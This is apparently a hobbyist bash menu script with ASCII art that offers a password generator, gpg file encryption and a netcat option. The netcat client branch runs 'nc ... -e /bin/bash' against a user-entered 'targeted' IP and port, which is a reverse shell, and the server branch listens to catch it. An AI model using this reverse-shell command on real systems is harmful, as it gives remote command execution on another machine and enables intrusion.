#!/bin/bash


echo 'ddddddhhhhhhhhhhhhhhhhhhhyysssssyyyyyyyyyyyyyyyyyyyyssssssss'
echo 'ddddhhhhhhhhhhhhhhhyso++++oooooooooooosyyyyyyyyyyyssssssssss'
echo 'dhhhhhhhhhhhhhhhyo++oooooooooooooooooooooooyyyyyyyssssssssss'
echo 'hhhhhhhhhhhhhho++ooooooooo++////++oooooooooosyyyyyysssssssss'
echo 'hhhhhhhhhhhho/ooooooo+:.`          `.:+ooooooossooosyyssssss'
echo 'hhhhhhhhhhy/+ooooo+-`                  `-+oooooso000oosossss'
echo 'hhhhhhhhhs/ooooo+-                        ./ooooos00000000oo'
echo 'hhhhhhhys+ooooo:     .++`           :+:     -ooooossssssssss'
echo 'hhhhhhhy+ooooo-     -NMMm          sMMM+     .ooooosgggggggg'
echo 'yyysyyyoooooo:      yMMMM-        `NMMMd      .ooooss++ossss'
echo 'sso++os+ooooo`      +MMMN`         dMMMy       +oooohsssssss'
echo 'syyyssoooooo/        +dy-          .ydo`       -ooooysssssss'
echo 'yyysssoooooo:                                  -ooooysssssss'
echo 'yyyyyysooooo/             .-////:.             :ooooysssssss'
echo 'yyyyyyysooooo`        `+hNMmddddNMNdo.         ooooohsssssso'
echo 'yyyyyyyyooooo:      .yNdo-`      `-omMh-      :ooooyysssssoo'
echo 'yyyyyyyyyooooo-    +Nh-              :dMo    -oooosysssssooo'
echo 'yyyyyyyyyyooooo/  +Mo                  sMo `/oooosysssssoooo'
echo 'yyyyyyyyyyysooooo-:-                    -:-ooooosysssssooooo'
echo 'yyyyyyyyssyysoooooo:.                  .:ooooosyysoooooooooo'
echo 'yyyyssssssssyysooooooo                oooooosyysoooooooooooo'
echo 'sssssssssssssssyysoooooooooo++++oooooooooosyysoooooooooooooo'
echo 'sssssssssssssssssyyyssoooooooooooooooosyyysooooooooooooooooo'
echo 'ssssssssssssssssssssssyyyyyyssssyyyyyssooooooooooooooooooooo'


echo '>>>>>>>>>>>>>>>>WELCOME TO BORING SCRIPT<<<<<<<<<<<<<<<<<<<<'
                                             echo 'Author: Sheikh Abdul Munim'
                                             echo 'Version->1.0'
echo '.................Being Boring Is New Cool.................'
echo '..............'
echo '............'
echo 'PLEASE SELECT THE OPTIONS BELOW'
echo '1->Password Generator'
echo '2->Encrypting/Decrypting file'
echo '3->Netcat'
read NUM

function netcat(){
echo 'The Swiss Army Knif'
echo '.'
echo '.'
echo '.'
echo '.'
echo 'Choose The Role'
echo '1->Server'
echo '2->Client'
read ROLE
if [ $ROLE = 1 ];
then
echo 'Please Enter The Port Number'
read PORT
nc -nvlp $PORT 
echo '.........'
echo 'Computer Has Been Setted As A Server'
else
echo 'Please Enter The Targeted Computer IP'
read IP 
echo 'Please Enter The Targeted Computer PORT'
read PORT
nc -nv $IP $PORT -e /bin/bash
fi
}
function machine(){
echo 'PLEASE CHOOSE WHAT YOU WANT'
echo '1->Encrypt'
echo '2->Decrypt'
read REPLY
if [ $REPLY = 1 ];
then
echo 'You have selected Encryption'
read -p 'please enter the path:' path
#parent=$(dirname '$path')
cd $path
echo 'please enter the file name'
read file
gpg -c $file
echo 'The file has been encrypted'
else
echo 'You have selected Decryption'
read -p 'please enter the path:' path1
#parent=$(dirname '$path')
cd $path1
echo 'please enter the file name'
read file2
gpg -d $file2
echo 'The file has been decrypted'
fi

}

if [ $NUM = 1 ];
then
echo 'Please Enter The Length Of Password'
read PASS_LEN
for p in $(seq 1 5);do

openssl rand -base64 48 | cut -c1-$PASS_LEN
done                                          
elif [ $NUM = 2 ];
then
machine
elif [ $NUM = 3 ];
then
netcat
else
echo 'MISSION ABORT'
fi

